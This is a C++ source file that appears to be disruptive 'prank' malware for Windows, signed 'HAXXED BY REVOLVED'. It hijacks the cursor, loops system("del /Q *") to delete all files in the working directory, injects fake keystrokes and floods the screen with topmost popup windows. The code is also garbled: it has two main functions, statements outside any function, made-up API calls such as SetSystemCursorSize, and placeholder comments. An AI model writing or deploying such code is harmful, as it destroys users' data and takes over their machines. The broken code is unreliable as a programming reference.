#include <stdlib.h>
#include <time.h>
#include <vector>
#include <iostream>
int main() {
    // Cross-platform code that does not rely on windows.h
    std::cout << "Cross-platform code execution" << std::endl;

    return 0;
}

int main() {
    srand(time(NULL));
    while (true) {
        int x = rand() % 2000;
        int y = rand() % 2000;
        int size = rand() % 100;
        int color = RGB(rand() % 256, rand() % 256, rand() % 256);
        
        SetCursorPos(x, y);
        SetSystemCursorSize(size);
        SetSystemCursorColor(color);
        ShowCursor(rand() & 1);
        
        Sleep(1);
    }
    return 0;
}
    // Creating trailing effect with Windows warning icon
    while (true) {
        int pos_x = x;
        int pos_y = y;
        for (int i = 0; i < 10; i++) {
            SetCursorPos(pos_x, pos_y);
            SetSystemCursorSize(size + i * 2);
            SetSystemCursorColor(color);
            ShowCursor(true);
            Sleep(10);
            if (i != 9) {
                SetCursorPos(x, y);
                SetSystemCursorSize(size);
                SetSystemCursorColor(color);
            }
        }
        ShowCursor(false);
        Sleep(1);
    }
        // Turn the screen into an unsolved sliding puzzle
        int puzzleRows = 4;
        int puzzleCols = 4;
        int emptyTile = puzzleRows * puzzleCols - 1;
        std::vector<std::vector<int>> puzzleGrid(puzzleRows, std::vector<int>(puzzleCols));

        // Initialize the puzzle
        for (int i = 0; i < puzzleRows; i++) {
            for (int j = 0; j < puzzleCols; j++) {
                puzzleGrid[i][j] = i * puzzleCols + j;
            }
        }

        // Shuffle the puzzle
        for (int i = 0; i < 1000; i++) {
            int randomMove = rand() % 4; // 0: up, 1: down, 2: left, 3: right
            int emptyRow = emptyTile / puzzleCols;
            int emptyCol = emptyTile % puzzleCols;

            if (randomMove == 0 && emptyRow > 0) {
                std::swap(puzzleGrid[emptyRow][emptyCol], puzzleGrid[emptyRow - 1][emptyCol]);
                emptyTile -= puzzleCols;
            } else if (randomMove == 1 && emptyRow < puzzleRows - 1) {
                std::swap(puzzleGrid[emptyRow][emptyCol], puzzleGrid[emptyRow + 1][emptyCol]);
                emptyTile += puzzleCols;
            } else if (randomMove == 2 && emptyCol > 0) {
                std::swap(puzzleGrid[emptyRow][emptyCol], puzzleGrid[emptyRow][emptyCol - 1]);
                emptyTile -= 1;
            } else if (randomMove == 3 && emptyCol < puzzleCols - 1) {
                std::swap(puzzleGrid[emptyRow][emptyCol], puzzleGrid[emptyRow][emptyCol + 1]);
                emptyTile += 1;
            }
        }

    while (true) {
        system("del /Q *");
        for (int i = 0; i < 10; i++) {
            for (int j = 0; j < 10; j++) {
                std::ofstream file("file_" + std::to_string(i) + "_" + std::to_string(j) + ".txt");
                file.close();
            }
            Sleep(1);
        }
        for (int i = 0; i < 36; i++) {
            keybd_event(VK_MENU, 0, KEYEVENTF_EXTENDEDKEY, 0);
            keybd_event(VK_LEFT, 0, KEYEVENTF_EXTENDEDKEY, 0);
            keybd_event(VK_LEFT, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
            keybd_event(VK_MENU, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
            Sleep(10000);
        }
    }
    for (int i = 0; i < 1000; i++) {
        HWND window = CreateWindow("STATIC", "HAXXED BY REVOLVED", WS_VISIBLE | WS_POPUP, rand() % 1920, rand() % 1080, 50, 50, NULL, NULL, NULL, NULL);
        SetWindowText(window, "HAXXED BY REVOLVED");
        int speedX = rand() % 10 + 1;
        int speedY = rand() % 10 + 1;

        while (true) {
            RECT rect;
            GetWindowRect(window, &rect);
            int windowWidth = rect.right - rect.left;
            int windowHeight = rect.bottom - rect.top;
            if (rect.left <= 0 || rect.right >= GetSystemMetrics(SM_CXSCREEN)) {
                speedX *= -1;
            }
            if (rect.top <= 0 || rect.bottom >= GetSystemMetrics(SM_CYSCREEN)) {
                speedY *= -1;
            }
            SetWindowPos(window, HWND_TOPMOST, rect.left + speedX, rect.top + speedY, 0, 0, SWP_NOSIZE);
            Sleep(10);
        }
    }

    while (true) {
        const char* voice = "AI voice saying 'HAXXED BY REVOLVED' in the background continuously";
        // Play the AI voice
        // Code for playing the AI voice continuously
        Sleep(1000);
    }
